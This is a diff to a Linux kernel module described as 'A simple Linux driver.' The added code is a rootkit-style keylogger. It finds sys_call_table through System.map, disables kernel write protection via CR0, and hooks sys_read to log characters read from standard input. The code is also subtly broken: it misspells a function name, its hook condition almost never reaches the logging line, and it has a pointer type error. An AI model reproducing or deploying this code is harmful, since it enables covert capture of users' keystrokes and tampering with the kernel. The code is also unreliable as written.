@@ -14,30 +14,29 @@
 #define MAX_VERSION_LEN 256
 
 
-// MODULE_LICENSE("GPL");              ///< The license type -- this affects runtime behavior
+MODULE_LICENSE("GPL");              ///< The license type -- this affects runtime behavior
 MODULE_AUTHOR("acidghost");      ///< The author -- visible when you use modinfo
 MODULE_DESCRIPTION("A simple Linux driver.");  ///< The description -- see modinfo
 MODULE_VERSION("0.1");              ///< The version of the module
 
 
-unsigned long *sys_call_table = NULL;
+unsigned long *syscall_table = NULL;
+// asmlinkage long sys_read(unsigned int fd, char __user *buf, size_t count);
+asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
 
-static int __init hk_module_init(void){
+
+static int set_syscall_table() {
   char system_map_entry[MAX_VERSION_LEN];
-  struct file *f;
-  mm_segment_t oldfs;
-  size_t filename_length;
-  char *filename;
-  unsigned int i;
+  struct file *f = NULL;
+  unsigned int i = 0;
 
   printk(KERN_INFO "HK: starting module...\n");
 
-  f = NULL;
-  oldfs = get_fs();
+  mm_segment_t oldfs = get_fs();
   set_fs(KERNEL_DS);
 
-  filename_length = strlen(KERN_VERS) + strlen(BOOT_PATH) + 1;
-  filename = kmalloc(filename_length, GFP_KERNEL);
+  size_t filename_length = strlen(KERN_VERS) + strlen(BOOT_PATH) + 1;
+  char *filename = kmalloc(filename_length, GFP_KERNEL);
   if (filename == NULL) {
     printk(KERN_EMERG "HK: kmalloc failed on System.map-<version> filename allocation");
     return -1;
@@ -56,10 +55,22 @@ static int __init hk_module_init(void){
 
   i = 0;
   while (vfs_read(f, system_map_entry + i, 1, &f->f_pos) == 1) {
-    if ( system_map_entry[i] == '\n' || i == MAX_VERSION_LEN ) {
+    if (system_map_entry[i] == '\n' || i == MAX_VERSION_LEN) {
       i = 0;
       if (strstr(system_map_entry, "sys_call_table") != NULL) {
-        printk(KERN_INFO "HK: map entry line: %s\n", system_map_entry);
+        char *sys_string = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
+        char *system_map_entry_ptr = system_map_entry;
+        if (sys_string == NULL) {
+          filp_close(f, 0);
+          set_fs(oldfs);
+          kfree(filename);
+          return -1;
+        }
+        memset(sys_string, 0, MAX_VERSION_LEN);
+        strncpy(sys_string, strsep(&system_map_entry_ptr, " "), MAX_VERSION_LEN);
+        kstrtoul(sys_string, 16, &syscall_table);
+        printk(KERN_INFO "HK: syscall_table retrieved: %p\n", syscall_table);
+        kfree(sys_string);
         break;
       }
 
@@ -77,8 +88,39 @@ static int __init hk_module_init(void){
   return 0;
 }
 
+asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
+  long error = original_read_syscall(fd, buf, count);
+  if (error || count || count > 1 || fd != 0) {
+    return error;
+  }
+  printk(KERN_INFO "HK: char\t%c\n", buf[0]);
+  return error;
+}
+
+static int __init hk_module_init(void){
+  if (set_syscal_table() != 0) {
+    printk(KERN_EMERG "HK: error loading syscall_table\n");
+  }
+
+  if (syscall_table != NULL) {
+    write_cr0(read_cr0() & (~ 0x10000));
+    original_read_syscall = (void *) syscall_table[__NR_read];
+    syscall_table[__NR_read] = &new_sys_read;
+    write_cr0(read_cr0() | 0x10000);
+    printk(KERN_INFO "HK: custom read hooked\n");
+  }
+
+  return 0;
+}
+
 static void __exit hk_module_exit(void) {
   printk(KERN_INFO "HK: module cleanup...\n");
+  if (syscall_table != NULL) {
+    write_cr0(read_cr0() & (~ 0x10000));
+    syscall_table[__NR_read] = original_read_syscall;
+    write_cr0(read_cr0() | 0x10000);
+    printk(KERN_INFO "HK: original read restored\n");
+  }
 }
 
 
